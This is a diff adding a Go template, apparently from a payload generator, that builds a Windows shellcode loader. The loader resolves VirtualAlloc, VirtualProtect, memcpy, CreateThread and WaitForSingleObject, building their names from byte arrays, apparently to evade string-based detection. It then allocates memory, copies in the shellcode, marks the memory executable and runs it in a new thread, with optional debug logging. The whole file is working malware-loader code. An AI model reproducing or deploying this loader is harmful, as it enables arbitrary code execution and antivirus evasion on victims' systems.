@@ -1,0 +1,122 @@
+const (
+	// MEM_COMMIT is a Windows constant used with Windows API calls
+	MEM_COMMIT = 0x1000
+	// MEM_RESERVE is a Windows constant used with Windows API calls
+	MEM_RESERVE = 0x2000
+	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
+	PAGE_EXECUTE_READ = 0x20
+	// PAGE_READWRITE is a Windows constant used with Windows API calls
+	PAGE_READWRITE = 0x04
+)
+
+func run(shellcode []byte) {
+    
+    {{if .Debug}}
+	printDebug("info","Loading kernel32.dll and msvcrt.dll")
+	{{end}}
+
+	kernel32 := windows.NewLazySystemDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
+    msvcrt := windows.NewLazyDLL(string([]byte{'m','s','v','c','r','t','.','d','l','l'}))
+
+    {{if .Debug}}
+	printDebug("info","Loading VirtualAlloc, VirtualProtect, memcpy, CreateThread, WaitForSingleObject procedures...")
+	{{end}}
+    
+	VirtualAlloc := kernel32.NewProc(string([]byte{'V','i','r','t','u','a','l','A','l','l','o','c'}))
+	VirtualProtect := kernel32.NewProc(string([]byte{'V','i','r','t','u','a','l','P','r','o','t','e','c','t'}))
+	memcpy := msvcrt.NewProc(string([]byte{'m','e','m','c','p','y'}))
+	CreateThread := kernel32.NewProc(string([]byte{'C','r','e','a','t','e','T','h','r','e','a','d'}))
+	WaitForSingleObject := kernel32.NewProc(string([]byte{'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t'}))
+
+	{{if .Debug}}
+	printDebug("info","Calling VirtualAlloc for shellcode...")
+	{{end}}
+
+	{{if .Debug}}
+	printDebug("info","Length of the shellcode: %d bytes",len(shellcode))
+	{{end}}
+
+	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+
+	if errVirtualAlloc != nil && errVirtualAlloc != syscall.Errno(0){
+		{{if .Debug}}
+		printDebug("error","Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error())
+		{{end}}
+        return
+	}
+
+
+	if addr == 0 {
+		{{if .Debug}}
+		printDebug("error","VirtualAlloc failed and returned 0")
+		{{end}}
+		return
+	}
+
+
+	{{if .Debug}}
+	printDebug("info","Allocated %d bytes", len(shellcode))
+	{{end}}
+
+    {{if .Debug}}
+	printDebug("debug","Copying shellcode to memory with memcpy...")
+	{{end}}
+
+    _, _, errMemCpy := memcpy.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+
+	if errMemCpy != nil && errMemCpy != syscall.Errno(0) {
+		{{if .Debug}}
+		printDebug("error","Error calling memcpy:\r\n%s", errMemCpy.Error())
+		{{end}}
+		return
+	}
+
+	{{if .Debug}}
+	printDebug("info","Shellcode copied to memory")
+	{{end}}
+
+	{{if .Debug}}
+	printDebug("debug","Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ...")
+	{{end}}
+
+	oldProtect := PAGE_READWRITE
+	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	if errVirtualProtect != nil && errVirtualProtect != syscall.Errno(0){
+		{{if .Debug}}
+		printDebug("error", "Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error())
+		{{end}}
+		return
+    }
+
+	{{if .Debug}}
+	printDebug("info","Shellcode memory region changed to PAGE_EXECUTE_READ")
+	{{end}}
+
+	{{if .Debug}}
+	printDebug("debug","Calling CreateThread...")
+	{{end}}
+	thread, _, errCreateThread := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
+
+	if errCreateThread != nil && errCreateThread != syscall.Errno(0){
+        {{if .Debug}}
+		printDebug("error", "Error calling CreateThread:\r\n%s", errCreateThread.Error())
+		{{end}}
+		return
+	}
+
+    {{if .Debug}}
+	printDebug("info","Shellcode Executed")
+	{{end}}
+
+    {{if .Debug}}
+	printDebug("debug","Calling WaitForSingleObject..")
+	{{end}}
+
+	_, _, errWaitForSingleObject := WaitForSingleObject.Call(thread, 0xFFFFFFFF)
+	if errWaitForSingleObject != nil && errWaitForSingleObject != syscall.Errno(0){
+        {{if .Debug}}
+		printDebug("error", "Error calling WaitForSingleObject:\r\n:%s", errWaitForSingleObject.Error())
+		{{end}}
+		return
+	}
+}
